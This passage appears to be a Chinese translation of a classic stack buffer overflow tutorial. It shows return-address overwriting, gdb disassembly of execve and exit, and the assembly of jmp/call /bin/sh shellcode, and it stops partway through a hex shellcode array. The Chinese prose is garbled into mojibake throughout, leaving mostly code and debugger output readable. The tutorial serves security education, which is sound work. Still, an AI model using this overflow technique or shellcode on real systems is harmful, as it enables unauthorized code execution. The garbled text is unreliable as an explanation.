ˆçš„å¤–è§‚\nè®©æˆ‘ä»¬å°è¯•ä¿®æ”¹æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªç¤ºä¾‹ï¼Œä½¿å…¶è¦†ç›–è¿”å›åœ°å€ï¼Œå¹¶è¯´æ˜å¦‚ä½•ä½¿å®ƒæ‰§è¡Œä»»æ„ä»£ç ã€‚å †æ ˆä¸Šçš„buffer1[]ä¹‹å‰æ˜¯SFPï¼Œè¿”å›åœ°å€ä¹‹å‰æ˜¯SFPã€‚é‚£æ˜¯4ä¸ªå­—èŠ‚ç»è¿‡buffer1[]çš„æœ«å°¾ã€‚ä½†æ˜¯è¯·è®°ä½ï¼Œbuffer1[]å®é™…ä¸Šæ˜¯2ä¸ªå­—ï¼Œå› æ­¤å®ƒçš„é•¿åº¦ä¸º8ä¸ªå­—èŠ‚ã€‚å› æ­¤ ï¼Œè¿”å›åœ°å€æ˜¯ä»buffer1[]çš„å¼€å¤´èµ·çš„12ä¸ªå­—èŠ‚ã€‚æˆ‘ä»¬å°†ä»¥ä½¿èµ‹å€¼è¯­å¥x = 1;çš„æ–¹å¼ä¿®æ”¹è¿”å›å€¼ã€‚ä¹‹åå‡½æ•°è°ƒç”¨å°†è¢«è·³è½¬è‡³æˆ‘ä»¬æŒ‡å®šçš„åœ°å€ã€‚ä¸ºæ­¤ ï¼Œæˆ‘ä»¬å°†8ä¸ªå­—èŠ‚æ·»åŠ åˆ°è¿”å›åœ°å€ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  //example3.c //gcc -fno-stack-protector -m32 void function(int a, int b, int c) { char buffer1[5]; char buffer2[10]; int *ret; ret = buffer1 + 12; (*ret) += 8; } void main() { int x; x = 0; function(1,2,3); x = 1; printf(\"%d\\n\",x); }   æˆ‘ä»¬æ‰€åšçš„åªæ˜¯å°†buffer1[]çš„åœ°å€åŠ äº†12ï¼Œç„¶åæ–°åœ°å€å°±æ˜¯å­˜å‚¨äº†retçš„è¿”å›åœ°å€ã€‚æˆ‘ä»¬æƒ³è¦è·³è¿‡printfçš„è°ƒç”¨ï¼Œæˆ‘ä»¬æ€ä¹ˆçŸ¥é“è¿”å›åœ°å€éœ€è¦+8ï¼ˆåº”è¯¥æ˜¯10ï¼‰å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥å…ˆæµ‹è¯•å€¼ï¼ˆæ¯”å¦‚example1ï¼‰ï¼Œç¼–è¯‘ç¨‹åºç„¶åç”¨gdbè°ƒè¯•\n$ gdb example3 GDB is free software and you are welcome to distribute copies of it under certain conditions; type \"show copying\" to see the conditions. There is absolutely no warranty for GDB; type \"show warranty\" for details. GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc... (no debugging symbols found)... (gdb) disassemble main Dump of assembler code for function main: Dump of assembler code for function main: 0x8000490 :pushl %ebp 0x8000491 :\tmovl %esp,%ebp 0x8000493 :\tsubl $0x4,%esp 0x8000496 :\tmovl $0x0,0xfffffffc(%ebp) 0x800049d :\tpushl $0x3 0x800049f :\tpushl $0x2 0x80004a1 :\tpushl $0x1 0x80004a3 :\tcall 0x8000470 0x80004a8 :\taddl $0xc,%esp 0x80004ab :\tmovl $0x1,0xfffffffc(%ebp) 0x80004b2 :\tmovl 0xfffffffc(%ebp),%eax 0x80004b5 :\tpushl %eax 0x80004b6 :\tpushl $0x80004f8 0x80004bb :\tcall 0x8000378 0x80004c0 :\taddl $0x8,%esp 0x80004c3 :\tmovl %ebp,%esp 0x80004c5 :\tpopl %ebp 0x80004c6 :\tret 0x80004c7 :\tnop æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è°ƒç”¨function()å‡½æ•°çš„è¿”å›åœ°å€ä¸º0x8004a8ï¼Œè€Œæˆ‘ä»¬æƒ³è·³è¿‡0x80004abå¤„çš„èµ‹å€¼ã€‚æˆ‘ä»¬è¦æ‰§è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤ä¸º0x8004b2ã€‚ä¸€ç‚¹æ•°å­¦è¿ç®—å³å¯å‘Šè¯‰æˆ‘ä»¬è·ç¦»ä¸º8ä¸ªå­—èŠ‚ï¼ˆåº”ä¸º10ä¸ªå­—èŠ‚ï¼‰\nShell Code å› æ­¤ï¼Œæ—¢ç„¶æˆ‘ä»¬çŸ¥é“å¯ä»¥ä¿®æ”¹è¿”å›åœ°å€å’Œæ‰§è¡Œæµç¨‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦æ‰§è¡Œä»€ä¹ˆç¨‹åºï¼Ÿåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åªå¸Œæœ›ç¨‹åºç”Ÿæˆä¸€ä¸ªshellã€‚ç„¶åï¼Œå¯ä»¥ä»shellä¸­æ ¹æ®éœ€è¦å‘å‡ºå…¶ä»–å‘½ä»¤ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬å°è¯•åˆ©ç”¨çš„ç¨‹åºä¸­æ²¡æœ‰è¿™æ ·çš„ä»£ç ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿæˆ‘ä»¬å¦‚ä½•å°†ä»»æ„æŒ‡ä»¤æ”¾å…¥å…¶åœ°å€ç©ºé—´ï¼Ÿç­”æ¡ˆæ˜¯å°†ä»£ç æ”¾åˆ°ä½ æƒ³æ‰§è¡Œç¼“å†²åŒºæº¢å‡ºçš„åœ°æ–¹ï¼Œå¹¶è¦†å†™è¿”å›åœ°å€ï¼Œä»¥ä¾¿å®ƒæŒ‡å‘ç¼“å†²åŒº ã€‚å‡è®¾å †æ ˆä»åœ°å€0xFFå¼€å§‹ï¼Œå¹¶ä¸”Sä»£è¡¨æˆ‘ä»¬è¦æ‰§è¡Œå †æ ˆçš„ä»£ç ï¼Œåˆ™å°†å¦‚ä¸‹æ‰€ç¤º\nåœ¨Cä¸­ç”Ÿæˆshellçš„ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7  #include \"stdio.h\"void main(){ char *name[2]; name[0] = \"/bin/sh\"; name[1] = NULL; execve(name[0],name,NULL); }   ä¸ºäº†æ‰¾å‡ºæ±‡ç¼–ä¸­çš„shellcodeï¼Œæˆ‘ä»¬å¯¹å…¶è¿›è¡Œç¼–è¯‘ï¼Œç„¶åå¯åŠ¨gdbã€‚è®°ä½è¦ä½¿ç”¨é™æ€æ ‡å¿—ã€‚å¦åˆ™ï¼Œå®é™…çš„ä»£ç  æ‰§è¡Œç³»ç»Ÿè°ƒç”¨å°†ä¸åŒ…æ‹¬åœ¨å†…ã€‚å–è€Œä»£ä¹‹çš„æ˜¯ï¼Œå°†æœ‰å¯¹åŠ¨æ€Cåº“çš„å¼•ç”¨ï¼Œè¯¥å¼•ç”¨é€šå¸¸ä¼šåœ¨åŠ è½½æ—¶é“¾æ¥åˆ°å…¶ä¸­ã€‚\n1  $ gcc -o shellcode -ggdb -static shellcode.c   $ gcc -o shellcode -ggdb -static shellcode.c [aleph1]$ gdb shellcode GDB is free software and you are welcome to distribute copies of it under certain conditions; type \"show copying\" to see the conditions. There is absolutely no warranty for GDB; type \"show warranty\" for details. GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc... (gdb) disassemble main Dump of assembler code for function main: 0x8000130 :\tpushl %ebp 0x8000131 :\tmovl %esp,%ebp 0x8000133 :\tsubl $0x8,%esp 0x8000136 :\tmovl $0x80027b8,0xfffffff8(%ebp) 0x800013d :\tmovl $0x0,0xfffffffc(%ebp) 0x8000144 :\tpushl $0x0 0x8000146 :\tleal 0xfffffff8(%ebp),%eax 0x8000149 :\tpushl %eax 0x800014a :\tmovl 0xfffffff8(%ebp),%eax 0x800014d :\tpushl %eax 0x800014e :\tcall 0x80002bc \u003c__execve\u003e 0x8000153 :\taddl $0xc,%esp 0x8000156 :\tmovl %ebp,%esp 0x8000158 :\tpopl %ebp 0x8000159 :\tret End of assembler dump (gdb) disassemble __execve Dump of assembler code for function __execve: 0x80002bc \u003c__execve\u003e:\tpushl %ebp 0x80002bd \u003c__execve+1\u003e:\tmovl %esp,%ebp 0x80002bf \u003c__execve+3\u003e:\tpushl %ebx 0x80002c0 \u003c__execve+4\u003e:\tmovl $0xb,%eax 0x80002c5 \u003c__execve+9\u003e:\tmovl 0x8(%ebp),%ebx 0x80002c8 \u003c__execve+12\u003e:\tmovl 0xc(%ebp),%ecx 0x80002cb \u003c__execve+15\u003e:\tmovl 0x10(%ebp),%edx 0x80002ce \u003c__execve+18\u003e:\tint\t$0x80 0x80002d0 \u003c__execve+20\u003e:\tmovl %eax,%edx 0x80002d2 \u003c__execve+22\u003e:\ttestl %edx,%edx 0x80002d4 \u003c__execve+24\u003e:\tjnl\t0x80002e6 \u003c__execve+42\u003e 0x80002d6 \u003c__execve+26\u003e:\tnegl %edx 0x80002d8 \u003c__execve+28\u003e:\tpushl %edx 0x80002d9 \u003c__execve+29\u003e:\tcall 0x8001a34 \u003c__normal_errno_location\u003e 0x80002de \u003c__execve+34\u003e:\tpopl %edx 0x80002df \u003c__execve+35\u003e:\tmovl %edx,(%eax) 0x80002e1 \u003c__execve+37\u003e:\tmovl $0xffffffff,%eax 0x80002e6 \u003c__execve+42\u003e:\tpopl %ebx 0x80002e7 \u003c__execve+43\u003e:\tmovl %ebp,%esp 0x80002e9 \u003c__execve+45\u003e:\tpopl %ebp 0x80002ea \u003c__execve+46\u003e:\tret 0x80002eb \u003c__execve+47\u003e:\tnop End of assembler dump.  è®©æˆ‘ä»¬äº†è§£è¿™å‘ç”Ÿäº†ä»€ä¹ˆï¼Œæˆ‘ä»¬ä»mainå‡½æ•°å¼€å§‹\n0x8000130 :\tpushl %ebp 0x8000131 :\tmovl %esp,%ebp 0x8000133 :\tsubl $0x8,%esp è¿™å°±æ˜¯ç¨‹åºçš„å‰å¥ï¼Œä»–é¦–å…ˆä¿å­˜æ—§çš„æ ˆå¸§æŒ‡é’ˆï¼Œä¿è¯ç°åœ¨çš„æ ˆé¡¶æŒ‡é’ˆæ˜¯ä¸€ä¸ªæ–°çš„æ ˆå¸§æŒ‡é’ˆï¼Œç„¶åä¸ºå±€éƒ¨å˜é‡ç•™å‡ºç©ºé—´ã€‚åœ¨è¿™ä¸ªshellcodeçš„ä¾‹å­ä¸­ï¼Œchar *name[2] ï¼Œ2ä¸ªåªæƒ³charå­—ç¬¦çš„æŒ‡é’ˆï¼ŒæŒ‡é’ˆå¤§å°ä¸ºä¸€ä¸ªå­—çš„é•¿åº¦ï¼Œæ‰€ä»¥è¿™é‡Œä¼šå¼€æ‹“ä¸¤ä¸ªå­—çš„å®¹é‡ï¼ˆ8 byteï¼‰\n  movl å’Œ leal æŒ‡ä»¤åŒºåˆ«ï¼š  movlæ˜¯æŠŠè®¿é—®çš„å†…å­˜å†…å®¹èµ‹å€¼ç»™å¯„å­˜å™¨ï¼Œ lealæ˜¯å°‡åœ°å€èµ‹å€¼ç»™å¯„å­˜å™¨ movl 0x18(%edx), %eax leal 0x18(%edx), %eax lealå°† 0x18(%edx)å¤„çš„å†…å®¹ï¼Œæ¯”å¦‚æ˜¯æ•°å­—4ï¼Œå°†4çš„åœ°å€ç»™eax movlåˆ™æ˜¯0x18(%edx)çš„å†…å®¹ç›´æ¥ç»™eaxï¼Œæ¯”å¦‚æ˜¯æ•°å­—4ï¼Œå°±æ˜¯å°†4è¿™ä¸ªå€¼ç»™eax\n 0x8000136 : movl $0x80027b8,0xfffffff8(%ebp) æˆ‘ä»¬å¤åˆ¶å€¼ 0x80027b8 (æŒ‡å‘å­—ç¬¦ä¸²\"/bin/sh\"çš„åœ°å€)åˆ°nameçš„ç¬¬ä¸€ä¸ªæŒ‡é’ˆã€‚è¿™ç›¸å½“äºchar[0] = \"/bin/sh\";\n0x800013d : movl $0x0,0xfffffffc(%ebp) æˆ‘ä»¬å°†NULLçš„å€¼(0x0)æ”¾åˆ°nameæ•°ç»„çš„ç¬¬äºŒä¸ªæŒ‡é’ˆä¸­ï¼Œç›¸å½“äºname[1] = NULL;ï¼Œå¯¹execve()çš„å®é™…è°ƒç”¨ä»è¿™é‡Œå¼€å§‹\n0x8000144 : pushl $0x0 æˆ‘ä»¬å°†execve()çš„å‚æ•°å€’åºæ¨è¿›æ ˆä¸­ã€‚æˆ‘ä»¬ä»NULLå€¼å¼€å§‹\n0x8000146 : leal 0xfffffff8(%ebp),%eax ç„¶åæˆ‘ä»¬åŠ è½½name[]æ•°ç»„çš„åœ°å€åˆ°eaxå¯„å­˜å™¨\n0x8000149 : pushl %eax æˆ‘ä»¬å°†name[]æ•°ç»„çš„åœ°å€æ¨è¿›æ ˆä¸­\n0x800014a : movl 0xfffffff8(%ebp),%eax æˆ‘ä»¬åŠ è½½å­—ç¬¦ä¸²\"/bin/sh\" çš„åœ°å€åˆ°eaxå¯„å­˜å™¨ä¸­\n0x800014d : pushl %eax å°†\"/bin/sh\"æ¨è¿›æ ˆä¸­\n0x800014e : call 0x80002bc \u003c__execve\u003e Call è°ƒç”¨åº“å‡½æ•°execve() ï¼ŒcallæŒ‡ä»¤å°†ä¸‹ä¸€ä¸ªæŒ‡ä»¤æŒ‡é’ˆï¼ˆIPï¼‰æ¨è¿›æ ˆä¸­\nç°åœ¨æ‰§è¡Œexecve() ï¼Œæ³¨æ„æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯åŸºäºIntelå¤„ç†å™¨çš„linuxç³»ç»Ÿã€‚è¿™ä¸ªç³»ç»Ÿè°ƒç”¨çš„ç»†èŠ‚å¯èƒ½ä¼šå› æ“ä½œç³»ç»Ÿå’ŒCPUçš„å˜åŒ–è€Œå˜åŒ–ã€‚ä¸€äº›ä¼šä¼ é€’å‚æ•°åˆ°æ ˆä¸­ï¼Œå¦ä¸€äº›ä¼šå°†å‚æ•°æ”¾è¿›å¯„å­˜å™¨ä¸­ã€‚ä¸€äº›ä½¿ç”¨è½¯ä»¶ä¸­æ–­è·³è½¬åˆ°å†…æ ¸æ¨¡å¼ï¼Œä¸€äº›ç”¨è¿œç¨‹è°ƒç”¨ï¼ˆa far callï¼‰ã€‚Linuxé€šè¿‡å¯„å­˜å™¨ä¼ é€’å‚æ•°ç»™ç³»ç»Ÿè°ƒç”¨ï¼Œä½¿ç”¨è½¯ä»¶ä¸­æ–­è¿›å…¥å†…æ ¸æ¨¡å¼ã€‚\n 0x80002bc \u003c__execve\u003e: pushl %ebp 0x80002bd \u003c__execve+1\u003e: movl %esp,%ebp 0x80002bf \u003c__execve+3\u003e: pushl %ebx è¿™æ˜¯è°ƒç”¨å‰å¥ã€‚\n0x80002c0 \u003c__execve+4\u003e: movl $0xb,%eax å°†0xb ï¼ˆåè¿›åˆ¶çš„11ï¼‰æ”¾å…¥æ ˆä¸­ï¼Œ11æ˜¯execveåœ¨ç³»ç»Ÿè°ƒç”¨è¡¨ä¸­çš„ç´¢å¼•(index)\n Linuxå¯åœ¨ä¸€ä¸‹è·¯å¾„ä¸‹æ‰¾åˆ°æ±‡ç¼–çš„ç³»ç»Ÿè°ƒç”¨çš„indexï¼š/usr/src/linux/include/asm/unistd.h\n 0x80002c5 \u003c__execve+9\u003e: movl 0x8(%ebp),%ebx å°†\"/bin/sh\"çš„åœ°å€æ”¾å…¥ebxå¯„å­˜å™¨\n0x80002c8 \u003c__execve+12\u003e: movl 0xc(%ebp),%ecx å°†name[]çš„åœ°å€æ”¾å…¥ecxå¯„å­˜å™¨\n0x80002cb \u003c__execve+15\u003e: movl 0x10(%ebp),%edx å°†ç©ºæŒ‡é’ˆ(NULLå€¼)çš„åœ°å€æ”¾å…¥edxå¯„å­˜å™¨\n0x80002ce \u003c__execve+18\u003e: int\t$0x80 è½¬æ¢æˆå†…æ ¸æ¨¡å¼\n æ­£å¦‚ä¸Šé¢æˆ‘ä»¬æ‰€çœ‹åˆ°çš„execve()çš„ç³»ç»Ÿè°ƒç”¨æ²¡æœ‰å¾ˆå¤šï¼Œæˆ‘ä»¬æ‰€è¦åšçš„ä»…ä»…æ˜¯ï¼š\n a. ä»¥\\0ç»“å°¾çš„å­—ç¬¦ä¸²\"/bin/sh\"æ”¾å…¥å†…å­˜ä¸­(a null terminated string \"/bin/sh\") b. åœ¨å†…å­˜ä¸­çš„æŸä¸ªä½ç½®æ”¾ç½®ä¸€ä¸ªåè·Ÿä¸€ä¸ªç©ºçš„å­—çš„å­—ç¬¦ä¸²\"/bin/sh\" c. å°†0xbæ”¾å…¥eaxå¯„å­˜å™¨ä¸­ï¼ˆexecveçš„ç³»ç»Ÿè°ƒç”¨ï¼‰ d. å°†\"/bin/sh\"å­—ç¬¦ä¸²çš„æŒ‡é’ˆçš„åœ°å€æ”¾å…¥ebxå¯„å­˜å™¨ä¸­ e. å°†\"/bin/sh\"å­—ç¬¦ä¸²çš„æŒ‡é’ˆæ”¾å…¥ecxå¯„å­˜å™¨ä¸­ f. å°†ç©ºæŒ‡é’ˆå¤åˆ¶è¿›EDXå¯„å­˜å™¨ä¸­ g. æ‰§è¡Œint $0x80æŒ‡ä»¤   what-is-a-null-terminated-string\n ä½†æ˜¯å‡å¦‚execve()çš„è°ƒç”¨ç”±äºæŸäº›åŸå› å¤±è´¥äº†å‘¢ï¼Ÿç¨‹åºä¼šç»§ç»­ä»æ ˆä¸­è·å–æŒ‡ä»¤æŒ‡é’ˆï¼Œè¿™ä¸ªæŒ‡é’ˆå¯èƒ½æŒ‡å‘ä¸€äº›éšæœºæ•°æ®ï¼ç¨‹åºæœ€ç»ˆå¯èƒ½å¼•å‘core dump (æ ¸å¿ƒè½¬å‚¨)ã€‚æˆ‘ä»¬æƒ³è¦ç¨‹åºåœ¨execve()è°ƒç”¨å¤±è´¥æ—¶å¹²å‡€åœ°é€€å‡ºã€‚å»å®Œæˆè¿™ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨execve()è°ƒç”¨åå¢æ·»exit()çš„è°ƒç”¨ã€‚exit()è°ƒç”¨é•¿ä»€ä¹ˆæ ·å‘¢ï¼Ÿ\n1 2 3 4 5  //exit.c #include \u003cstdlib.h\u003evoid main(){ exit(0); }   $ gcc -o exit -static exit.c $ gdb exit GDB is free software and you are welcome to distribute copies of it under certain conditions; type \"show copying\" to see the conditions. There is absolutely no warranty for GDB; type \"show warranty\" for details. GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc... (no debugging symbols found)... (gdb) disassemble _exit Dump of assembler code for function _exit: 0x800034c \u003c_exit\u003e:\tpushl %ebp 0x800034d \u003c_exit+1\u003e:\tmovl %esp,%ebp 0x800034f \u003c_exit+3\u003e:\tpushl %ebx 0x8000350 \u003c_exit+4\u003e:\tmovl $0x1,%eax 0x8000355 \u003c_exit+9\u003e:\tmovl 0x8(%ebp),%ebx 0x8000358 \u003c_exit+12\u003e: int$0x80 0x800035a \u003c_exit+14\u003e: movl 0xfffffffc(%ebp),%ebx 0x800035d \u003c_exit+17\u003e: movl %ebp,%esp 0x800035f \u003c_exit+19\u003e: popl %ebp 0x8000360 \u003c_exit+20\u003e: ret 0x8000361 \u003c_exit+21\u003e: nop 0x8000362 \u003c_exit+22\u003e: nop 0x8000363 \u003c_exit+23\u003e: nop End of assembler dump. exit()çš„ç³»ç»Ÿè°ƒç”¨ä¼šæŠŠ0x1æ”¾åˆ°eaxï¼Œå°†é€€å‡ºä»£ç (exit code)æ”¾å…¥ebxå¯„å­˜å™¨ï¼Œç„¶åæ‰§è¡Œint 0x80 ã€‚å¤§å¤šç¨‹åºreturn 0åœ¨exit codeï¼Œæ„å‘³ç€æ²¡æœ‰é”™è¯¯ã€‚æˆ‘ä»¬å°†0æ”¾åˆ°ebxå¯„å­˜å™¨ä¸­ã€‚ç°åœ¨æˆ‘ä»¬çš„æ­¥éª¤å¦‚ä¸‹\n a. ä»¥\\0ç»“å°¾çš„å­—ç¬¦ä¸²\"/bin/sh\"æ”¾å…¥å†…å­˜ä¸­(a null terminated string \"/bin/sh\") b. åœ¨å†…å­˜ä¸­çš„æŸä¸ªä½ç½®æ”¾ç½®ä¸€ä¸ªåè·Ÿä¸€ä¸ªç©ºçš„å­—çš„å­—ç¬¦ä¸²\"/bin/sh\" c. å°†0xbæ”¾å…¥eaxå¯„å­˜å™¨ä¸­ï¼ˆexecveçš„ç³»ç»Ÿè°ƒç”¨ï¼‰ d. å°†\"/bin/sh\"å­—ç¬¦ä¸²çš„æŒ‡é’ˆçš„åœ°å€æ”¾å…¥ebxå¯„å­˜å™¨ä¸­ e. å°†\"/bin/sh\"å­—ç¬¦ä¸²çš„æŒ‡é’ˆæ”¾å…¥ecxå¯„å­˜å™¨ä¸­ f. å°†ç©ºæŒ‡é’ˆå¤åˆ¶è¿›EDXå¯„å­˜å™¨ä¸­ g. æ‰§è¡Œint $0x80æŒ‡ä»¤ h. å°†0x1æ”¾å…¥eaxå¯„å­˜å™¨ä¸­ i. å°†0x0æ”¾å…¥ebxå¯„å­˜å™¨ä¸­ j. æ‰§è¡Œint 0x80æŒ‡ä»¤  å°è¯•å°†ä»¥ä¸Šæ”¾å…¥æ±‡ç¼–è¯­è¨€ä¸­ï¼Œå°†å­—ç¬¦ä¸²æ”¾åˆ°ä»£ç åï¼Œç„¶åè®°ä½æˆ‘ä»¬æ”¾å­—ç¬¦ä¸²çš„åœ°å€ï¼Œç„¶ååœ¨æ•°ç»„åé¢è·Ÿçš„ä¸€ä¸ªç©ºå­—ç¬¦ï¼Œå¦‚ä¸‹ï¼š\nmovl string_addr,string_addr_addr movb $0x0,null_byte_addr movl $0x0,null_addr movl $0xb,%eax movl string_addr,%ebx leal string_addr,%ecx leal null_string,%edx int\t$0x80 movl $0x1, %eax movl $0x0, %ebx int\t$0x80 /bin/sh string goes here. ç°åœ¨é—®é¢˜æ˜¯ï¼Œæˆ‘ä»¬ä¸çŸ¥é“æˆ‘ä»¬æƒ³è¦expä»£ç ä¼šæ”¾åœ¨ç¨‹åºçš„å†…å­˜ç©ºé—´çš„ä½•å¤„ã€‚æœ‰ä¸€ä¸ªåŠæ³•æ˜¯æˆ‘ä»¬ç”¨jmpå’ŒcallæŒ‡ä»¤è·³è½¬ã€‚jmpæŒ‡ä»¤å’ŒcallæŒ‡ä»¤å¯ä»¥ä½¿ç”¨æŒ‡ä»¤å¯„å­˜å™¨ä¸­(IP)ç›¸å…³çš„åœ°å€ï¼Œæ„å‘³ç€åœ¨æˆ‘ä»¬ä¸çŸ¥é“æˆ‘ä»¬æƒ³è¦è·³è½¬çš„ç¡®åˆ‡åœ°å€æ—¶ï¼Œæˆ‘ä»¬è·³è½¬è‡³ç›¸å¯¹äºæŒ‡ä»¤æŒ‡é’ˆæœ‰ä¸€å®šåç§»é‡çš„åœ°å€ï¼ˆç›¸å¯¹å¯»å€ï¼‰ã€‚å¦‚æœæˆ‘ä»¬åœ¨ \"/bin/sh\" å­—ç¬¦ä¸²ä¹‹å‰æ”¾ç½®ä¸€æ¡CALLæŒ‡ä»¤ï¼Œå¹¶åœ¨å…¶å‰é¢æ”¾ç½®ä¸€æ¡JMPæŒ‡ä»¤ï¼Œåˆ™åœ¨æ‰§è¡ŒCALLæ—¶ï¼Œå­—ç¬¦ä¸²åœ°å€å°†è¢«ä½œä¸ºè¿”å›åœ°å€å‹å…¥å †æ ˆã€‚ç„¶åï¼Œæˆ‘ä»¬æ‰€è¦åšçš„å°±æ˜¯å°†è¿”å›åœ°å€å¤åˆ¶åˆ°å¯„å­˜å™¨ä¸­ã€‚CALLæŒ‡ä»¤å¯ä»¥ç®€å•åœ°è°ƒç”¨ä¸Šé¢ä»£ç çš„å¼€å¤´ã€‚ ç°åœ¨å‡è®¾Jä»£è¡¨JMPæŒ‡ä»¤ï¼ŒCä»£è¡¨CALLæŒ‡ä»¤ï¼Œè€Œsä»£è¡¨å­—ç¬¦ä¸²\nï¼ˆå›¾ä¸­æ²¡æœ‰è¶³å¤Ÿçš„å°sï¼Œstrlen(\"/bin/sh\") == 7ï¼‰åœ¨è¿™ä¸ªä¿®æ”¹ä¸‹ï¼Œç”¨ç´¢å¼•å¯»å€ï¼Œç„¶åå†™ä¸‹æ¯ä¸ªæŒ‡ä»¤å ç”¨æˆ‘ä»¬ä»£ç çš„å­—èŠ‚æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\njmp\toffset-to-call\t# 2 bytes popl %esi\t# 1 byte movl %esi,array-offset(%esi) # 3 bytes movb $0x0,nullbyteoffset(%esi)\t# 4 bytes movl $0x0,null-offset(%esi) # 7 bytes movl $0xb,%eax\t# 5 bytes movl %esi,%ebx\t# 2 bytes leal array-offset(%esi),%ecx # 3 bytes leal null-offset(%esi),%edx # 3 bytes int\t$0x80\t# 2 bytes movl $0x1, %eax\t# 5 bytes movl $0x0, %ebx\t# 5 bytes int\t$0x80\t# 2 bytes call offset-to-popl\t# 5 bytes /bin/sh string goes here è®¡ç®—jmpå’Œcallä¹‹é—´çš„åç§»é‡ï¼Œcallå’Œpoplä¹‹é—´çš„åç§»é‡ï¼Œå­—ç¬¦ä¸²åœ°å€å’Œæ•°ç»„çš„åç§»é‡ï¼Œä»¥åŠå­—ç¬¦ä¸²æ•°ç»„å’Œç©ºå­—ç¬¦çš„åç§»é‡\nå¦‚ä¸‹ï¼š\njmp 0x26 # 2 bytes popl %esi # 1 byte movl %esi,0x8(%esi) # 3 bytes movb $0x0,0x7(%esi) # 4 bytes movl $0x0,0xc(%esi) # 7 bytes movl $0xb,%eax # 5 bytes movl %esi,%ebx\t# 2 bytes leal 0x8(%esi),%ecx # 3 bytes leal 0xc(%esi),%edx\t# 3 bytes int\t$0x80\t# 2 bytes movl $0x1, %eax # 5 bytes movl $0x0, %ebx\t# 5 bytes int\t$0x80\t# 2 bytes call -0x2b # 5 bytes .string \\\"/bin/sh\\\"\t# 8 bytes çœ‹èµ·æ¥æŒºå¥½çš„ï¼Œç¡®å®šè¿™ä¸ªèƒ½æ­£å¸¸å·¥ä½œæˆ‘ä»¬å¿…é¡»å°è¯•å»ç¼–è¯‘å¹¶è¿è¡Œä»–ã€‚ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬çš„ä»£ç ä¼šä¿®æ”¹ä»–è‡ªå·±(where? ä¸ªäººè®¤ä¸ºæ˜¯åœ¨ç¼–è¯‘é˜¶æ®µçš„ä¼˜åŒ–)ï¼Œä½†æ˜¯å¤§å¤šçš„æ“ä½œç³»ç»ŸæŠŠä»£ç æ®µæ ‡è®°ä¸ºread-onlyã€‚ä¸ºäº†ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œæˆ‘ä»¬å¿…é¡»å°†è¦æ‰§è¡Œçš„ä»£ç æ”¾åœ¨å †æ ˆæˆ–æ•°æ®æ®µä¸­ï¼Œå¹¶å°†æ§åˆ¶æƒè½¬ç§»ç»™å®ƒã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å°†æŠŠä»£ç æ”¾åœ¨æ•°æ®æ®µçš„å…¨å±€æ•°ç»„ä¸­ã€‚æˆ‘ä»¬é¦–å…ˆéœ€è¦äºŒè¿›åˆ¶ä»£ç çš„åå…­è¿›åˆ¶è¡¨ç¤ºã€‚è®©æˆ‘ä»¬å…ˆç¼–è¯‘å®ƒï¼Œç„¶åä½¿ç”¨gdbè·å¾—å®ƒ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  //shellcodeasm.c void main(){ __asm__(\"  jmp\t0x2a # 3 bytes popl %esi\t# 1 byte movl %esi,0x8(%esi) # 3 bytes movb $0x0,0x7(%esi)\t# 4 bytes movl $0x0,0xc(%esi) # 7 bytes movl $0xb,%eax # 5 bytes movl %esi,%ebx\t# 2 bytes leal 0x8(%esi),%ecx # 3 bytes leal 0xc(%esi),%edx\t# 3 bytes int\t$0x80\t# 2 bytes movl $0x1, %eax # 5 bytes movl $0x0, %ebx\t# 5 bytes int\t$0x80\t# 2 bytes call -0x2f # 5 bytes .string \\\"/bin/sh\\\"# 8 bytes \");  }   [aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c [aleph1]$ gdb shellcodeasm GDB is free software and you are welcome to distribute copies of it under certain conditions; type \"show copying\" to see the conditions. There is absolutely no warranty for GDB; type \"show warranty\" for details. GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc... (gdb) disassemble main Dump of assembler code for function main: 0x8000130 :pushl %ebp 0x8000131 :movl %esp,%ebp 0x8000133 :jmp\t0x800015f 0x8000135 :popl %esi 0x8000136 :movl %esi,0x8(%esi) 0x8000139 :movb $0x0,0x7(%esi) 0x800013d :movl $0x0,0xc(%esi) 0x8000144 :movl $0xb,%eax 0x8000149 :movl %esi,%ebx 0x800014b :leal 0x8(%esi),%ecx 0x800014e :leal 0xc(%esi),%edx 0x8000151 :int\t$0x80 0x8000153 :movl $0x1,%eax 0x8000158 :movl $0x0,%ebx 0x800015d :int\t$0x80 0x800015f :call 0x8000135 0x8000164 :das 0x8000165 :boundl 0x6e(%ecx),%ebp 0x8000168 :das 0x8000169 :jae 0x80001d3 \u003c__new_exitfn+55\u003e 0x800016b :addb %cl,0x55c35dec(%ecx) End of assembler dump. (gdb) x/bx main+3 0x8000133 :0xeb (gdb) 0x8000134 :0x2a (gdb) . . . 1 2 3 4 5 6 7  //testsc.c char shellcode[] = \"\\xeb\\x2a\\x5e\\x89\\x76\\x08\\xc6\\x46\\x07\\x00\\xc7\\x46\\x0c\\x00\\x00\\x00\" \"\\x00\\xb8\\x0b\\x00\\x00\\x00\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\" 